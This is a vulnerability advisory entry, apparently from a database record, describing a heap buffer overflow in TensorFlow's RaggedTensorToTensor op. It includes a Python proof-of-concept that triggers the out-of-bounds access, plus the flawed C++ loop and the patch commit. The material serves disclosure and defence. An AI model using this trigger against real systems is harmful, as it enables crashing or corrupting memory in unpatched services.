    "description": "From NVD:\nTensorFlow is an end-to-end open source platform for machine learning. An attacker can cause a heap buffer overflow in `tf.raw_ops.RaggedTensorToTensor`. This is because the implementation(https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) uses the same index to access two arrays in parallel. Since the user controls the shape of the input arguments, an attacker could trigger a heap OOB access when `parent_output_index` is shorter than `row_split`. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\nFrom Github:\n### Impact\nAn attacker can cause a heap buffer overflow in `tf.raw_ops.RaggedTensorToTensor`:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([10, 10], shape=[2], dtype=tf.int64)\nvalues = tf.constant(0, shape=[1], dtype=tf.int64)\ndefault_value = tf.constant(0, dtype=tf.int64)\nl = [849, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nrow = tf.constant(l, shape=[5, 43], dtype=tf.int64)\nrows = [row]\ntypes = ['ROW_SPLITS']\n\ntf.raw_ops.RaggedTensorToTensor(\n    shape=shape, values=values, default_value=default_value,\n    row_partition_tensors=rows, row_partition_types=types) \n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) uses the same index to access two arrays in parallel:\n\n```cc\nfor (INDEX_TYPE i = 0; i < row_split_size - 1; ++i) {\n  INDEX_TYPE row_length = row_split(i + 1) - row_split(i);\n  INDEX_TYPE real_length = std::min(output_size, row_length);\n  INDEX_TYPE parent_output_index_current = parent_output_index[i];\n  ...\n}\n```\n\nSince the user controls the shape of the input arguments, an attacker could trigger a heap OOB access when `parent_output_index` is shorter than `row_split`.\n\n### Patches\nWe have patched the issue in GitHub commit [a84358aa12f0b1518e606095ab9cfddbf597c121](https://github.com/tensorflow/tensorflow/commit/a84358aa12f0b1518e606095ab9cfddbf597c121).\n\nThe fix will be included in TensorFlow 2.5.0.
